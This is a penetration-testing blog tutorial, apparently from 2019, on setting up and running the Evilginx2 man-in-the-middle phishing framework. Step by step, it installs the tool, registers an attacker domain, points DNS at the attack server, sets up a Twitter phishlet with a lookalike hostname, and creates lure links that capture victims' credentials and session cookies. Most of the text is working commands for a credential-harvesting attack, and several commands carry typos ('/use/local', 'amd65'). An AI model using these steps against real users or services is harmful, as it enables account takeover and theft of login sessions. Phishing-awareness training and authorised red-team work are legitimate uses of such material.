<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/penetration-testing/" rel="category tag">Penetration Testing</a></span>            </div>
            <h1 class="post-title entry-title">Evilginx2- Advanced Phishing Attack Framework</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/evilginx2-advanced-phishing-attack-framework/" rel="bookmark"><time class="entry-date published updated" datetime="2019-06-10T07:36:48+00:00">June 10, 2019</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">This is the successor of Evilginx 1, and it stays in-line with the MITM lineage. This tool is designed for a Phishing attack to capture login credentials and a session cookie. </span></p>
<h3><span style="color: #000000;"><strong><span style="color: #800000;">Table of Content</span> </strong></span></h3>
<p><span style="color: #000000;">Overview</span></p>
<p><span style="color: #000000;">Setup</span></p>
<ul>
<li><span style="color: #000000;">Perquisites</span></li>
<li><span style="color: #000000;">Installation</span></li>
<li><span style="color: #000000;">Domain Setup</span></li>
<li><span style="color: #000000;">Priming Evilginx</span></li>
</ul>
<p><span style="color: #000000;">Execution</span></p>
<ul>
<li><span style="color: #000000;">Lure Creation</span></li>
<li><span style="color: #000000;">Attack Simulation</span></li>
</ul>
<h3><span style="color: #800000;"><strong>Overview </strong></span></h3>
<p><span style="color: #000000;">One of the biggest concerns in today’s cyberspace is Phishing, it’s one of those things that uses what a user is familiar with against them. This is a MITM attack framework that sits between the user and site that they are trying to access to potentially steal their credentials. The framework is written in GO and implements its own HTTP and DNS server, making the setup process a breeze.</span></p>
<h3><span style="color: #800000;"><strong>Setup</strong></span></h3>
<p><span style="color: #000000;">Let’s get acquainted with Evilginx2. The first thing we need to do is setup the Evilginx2 application on our attacking machine, let’s get the IP.</span></p>
<pre class="lang:default decode:true">ifconfig</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-tmCGNkTGQ1I/XP4DG3bT4yI/AAAAAAAAer0/LXXNY1exB90mV95x7oUOzLFqe_rBQDAOwCLcBGAs/s1600/1.png"/></span></p>
<h3><span style="color: #800000;"><strong>Perquisites </strong></span></h3>
<p><span style="color: #000000;">Evilginx has a few requirements before it can be installed and start working optimally, let’s take of them first.</span></p>
<p><span style="color: #000000;">We use pscp to upload the go install file to our attacking machine, defining where it can find the file and the credentials and IP of the destination machine. Go is a prerequisite for setting up evilginx. You can get Go 1.10.0 from <a style="color: #000000;" href="https://golang.org/dl/">here</a>.</span></p>
<pre class="lang:default decode:true">pscp.exe c:\go1.10.linux-amd64.tar.gz root@68.183.85.197:/tmp/go1.10.linux-amd65.tar.gz</pre>
<p><span style="color: #000000;"><strong><img decoding="async" src="https://1.bp.blogspot.com/-pNWMw_qWR9o/XP4DKbnRC2I/AAAAAAAAesc/w67GSurW_iUcFnKRbRQhOC2DhEqpvvocgCLcBGAs/s1600/2.png"/></strong></span></p>
<p><span style="color: #000000;">Once we have to Go in our machine we unpack and install it. Pscp deposited our Go file in the tmp folder. We will now be using the following commands to install Go and check its version:</span></p>
<pre class="lang:default decode:true">cd /tmp/
ls
tar -C /use/local -xzf go1.10.linux-amd64.tar.gz
export PATH=$PATH:/use/local/go/bin
source $HOME/ .profile
go version</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-cjYG9enfdt0/XP4DK8ocLsI/AAAAAAAAesk/kUJ8mfH2gdQfX63msmgMwIh1ZajbwmJVwCLcBGAs/s1600/3.png"/></span></p>
<p><span style="color: #000000;">Go needs to be added to ~/.profieles now, here’s how you do it:</span></p>
<p><span style="color: #000000;">Open the. profiles file in nano or any other text editor and type in the following</span></p>
<pre class="lang:default decode:true">export GOPATH=$HOME/go
export PATH=$PATH:/usr/local/go/bin:$GOPATH/bin</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-0xmnI50mAN0/XP4DK1xlrHI/AAAAAAAAesg/laoFJh0_9cENgyn6y7Weow9qHjFTzQ9agCLcBGAs/s1600/4.png"/></span></p>
<p><span style="color: #000000;">Next, install git make by typing the following:</span></p>
<pre class="lang:default decode:true">apt-get install git make</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-UfXBUht8bfs/XP4DLMY46DI/AAAAAAAAeso/zL2sLBagUasyV6WR44EiITlrtQ6gc5g2ACLcBGAs/s1600/5.png"/></span></p>
<h3><span style="color: #800000;"><strong>Installation</strong></span></h3>
<p><span style="color: #000000;">Now we are ready to install Evilginx, let’s see how.</span></p>
<pre class="lang:default decode:true">go get -u github.com/kgretzky/evilginx2
cd $GOPATH/src/github.com/kgretzky/evilginx2
make
make install</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-2Rc0ouL3bfY/XP4DLpQkL7I/AAAAAAAAess/FQUvTXYKMv4te7oxtj8kR5MMY-ipSsPXwCLcBGAs/s1600/6.png"/></span></p>
<p><span style="color: #000000;">Let’s launch Evilginx by running the script.</span></p>
<pre class="lang:default decode:true">./evilginx</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-KjYumNJ3iDw/XP4DLzj6FPI/AAAAAAAAesw/wmFHINNXzOg-YQOg6txagDkuhltfU69vwCLcBGAs/s1600/7.png"/></span></p>
<p><span style="color: #000000;">There is multiple built-in options that the attacker can utilize to choose a site template called Phishlets.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-kaigFThuPws/XP4DMPjh5JI/AAAAAAAAes0/_TED35iBJnoIKs0St_5DwJ_Y1mc3abEmgCLcBGAs/s1600/8.png"/></span></p>
<h3><span style="color: #800000;"><strong>Domain Setup</strong></span></h3>
<p><span style="color: #000000;">Evilginx works as a relay between the victim and the legitimate website that they are trying to access, to achieve this, the attacker needs a domain of their own. There are plenty of resources on the web from where a free domain can be attained temporarily, we used one such resource. We have setup an attacking domain: userid.cf.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-xYpvMgwJ4Zk/XP4DMgNH0hI/AAAAAAAAes4/EWHTnfNUQsY6aJJSIvG-ZwoyceFFMYLiACLcBGAs/s1600/9.png"/></span></p>
<p><span style="color: #000000;">The IP of our attacking machine is used in the IP address for the nameserver, if you recall, we noted it earlier on in the process.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ZG7T3e7gwo0/XP4DG59st7I/AAAAAAAAer4/Gx-Z9C9NEaYBTejYDh4_LOgElfGdhMF3ACLcBGAs/s1600/10.png"/></span></p>
<h3><span style="color: #000000;"><strong><span style="color: #800000;">Priming Evilginx</span> </strong></span></h3>
<p><span style="color: #000000;">This is the part where we prime Evilginx for the attack. At the Evilginx terminal, we use the help command to see the various general configuration options that it has.</span></p>
<pre class="lang:default decode:true">help</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ZTFWF54DJIQ/XP4DHLyXF3I/AAAAAAAAerw/Tzdf19NeXKcyfOe84Vrh6qRXnnf_kDCGwCLcBGAs/s1600/11.png"/></span></p>
<p><span style="color: #000000;">We need to configure Evilginx to use the domain name that we have set up for it and the IP for the attacking machine.</span></p>
<pre class="lang:default decode:true">config domain userid.cf
config ip 68.183.85.197</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Ehv_klpMIkg/XP4DIODw8oI/AAAAAAAAer8/NhIKYKGQlYg-qvjmQq-9yjE9sB1mtY-ZACLcBGAs/s1600/12.png"/></span></p>
<p><span style="color: #000000;">Time to setup the domains. We have used the twitter phishlet with our domain and Evilginx gives us options of modified domain names that we can setup in our hosting site</span></p>
<pre class="lang:default decode:true">phishlets hostname twitter twittwer.com.userid.cf
phishlets get-hosts twitter</pre>
<p><span style="color: #000000;"><strong><img decoding="async" src="https://1.bp.blogspot.com/-zutIeGNrbkA/XP4DIV9PzWI/AAAAAAAAesA/xdiqlh_EuKgdoM6y04IluKmbOKv2rpVqgCLcBGAs/s1600/13.png"/></strong></span></p>
<p><span style="color: #000000;">In our hosting site, we set the A record, which will the IP of the attacking machine and then copy and paste the domain names provided by Evilginx. One thing to note here, we don’t need to copy the “userid.cf” part, we just need the preceding string.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-EEHLXhi3cXs/XP4DIgiIJrI/AAAAAAAAesE/XAmaK7PIK8wYaW6F_rHa1_ckPY4hABWPACLcBGAs/s1600/14.png"/></span></p>
<h3><span style="color: #800000;"><strong>Execution</strong></span></h3>
<p><span style="color: #000000;">We now have everything we need to execute a successful attack using Evilginx.</span></p>
<p><span style="color: #000000;">The settings have been put into place, now we can start using the tool for what it is intended</span></p>
<pre class="lang:default decode:true">phishlets enable twitter</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Y0IzTjmzV_g/XP4DIoo2P8I/AAAAAAAAesI/RSmO3DDEatMYFxS084i67d1K57Uc9LwJgCLcBGAs/s1600/15.png"/></span></p>
<h3><span style="color: #000000;"><strong><span style="color: #800000;">Lure Creation</span> </strong></span></h3>
<p><span style="color: #000000;">We now need a link that the victim clicks on, in Evilginx, the term for the link is “Lures”.</span></p>
<p><span style="color: #000000;">The help command shows us what options we must use for setting up the lures.</span></p>
<pre class="lang:default decode:true">help lures</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ZLBjmjB638w/XP4DJfv4g8I/AAAAAAAAesM/SRTvn8piYwE_U9efqdaopcE9JTLxBAfXwCLcBGAs/s1600/16.png"/></span></p>
<p><span style="color: #000000;">The lures have to be attached with our desired phishlet and a redirect has to be set to point towards the legitimate website that we are trying to harvest credentials for. Once the lures have been configured, we can see what the configurations yield.</span></p>
<pre class="lang:default decode:true">lures
lures create twitter
lures edit redirect_url 0 =’https://www.twitter.com’
lures
lures get-url 0</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-_dA4rWfTW-4/XP4DJn--7HI/AAAAAAAAesQ/hB2bxPgvoMURX4ibj61NugK96rSutvxbQCLcBGAs/s1600/17.png"/></strong></span></p>
<h3><span style="color: #000000;"><strong><span style="color: #800000;">Attack Simulation</span> </strong></span></h3>
<p><span style="color: #000000;">When a victim clicks on our created lure, they will be sent to out phishlet, as can be seen below.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-sw9FuzPqUVU/XP4DJ5UpOgI/AAAAAAAAesU/G4biML5SP8osu7uSZjJ1KjiCO7z3fAPrACLcBGAs/s1600/18.png"/></span></p>
<p><span style="color: #000000;">The victim enters their credentials and we see Evilginx capturing them and relaying them to the attack machines terminal.</span></p>
<p><span style="color: #000000;">This is a great tool to explore and understand phishing but at the same time, be sure to use it in a controlled setting.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-vCe2AtdO11Q/XP4DKILA5aI/AAAAAAAAesY/RhBr6uPgqJo7FSp4xpZ5e1wJI5U378kbgCLcBGAs/s1600/19.png"/></span></p>
<p><span style="color: #000000;"><strong>Author</strong>: Sanjeet Kumar is an Information Security Analyst | Pentester | Researcher  Contact <a class="broken_link" style="color: #000000;" href="https://www.linkedin.com/in/sanjeet-kumar-27828058/"><strong>Here</strong></a></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
